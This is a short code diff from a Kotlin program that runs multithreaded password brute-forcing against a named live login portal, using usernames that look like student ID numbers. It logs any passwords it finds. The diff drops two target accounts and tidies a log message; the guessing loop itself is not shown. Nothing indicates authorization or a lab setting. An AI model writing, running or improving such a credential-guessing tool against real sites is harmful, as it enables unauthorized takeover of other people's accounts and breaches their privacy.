@@ -10,7 +10,6 @@ import kotlin.concurrent.thread
 import kotlin.system.measureTimeMillis
 
 
-
 fun main() {
 
     //This machine has a 6 cores hyper-threaded CPU
@@ -20,10 +19,7 @@ fun main() {
     bruteforceTask("2023/2503")
     bruteforceTask("2023/2509")
     bruteforceTask("2023/2510")
-    bruteforceTask("2023/2511")
-    bruteforceTask("2023/2512")
 }
-
 
 
 const val url = "https://saksham.sitslive.com/login"
@@ -91,7 +87,7 @@ fun bruteforceTask(username:String){
                 logger.info("Password found of $username: $password")
             }
         }
-        logger.info("Bruteforce finished by in: $threadExecutionTime ms")
+        logger.info("Bruteforce finished in: $threadExecutionTime ms")
     }
 }
 
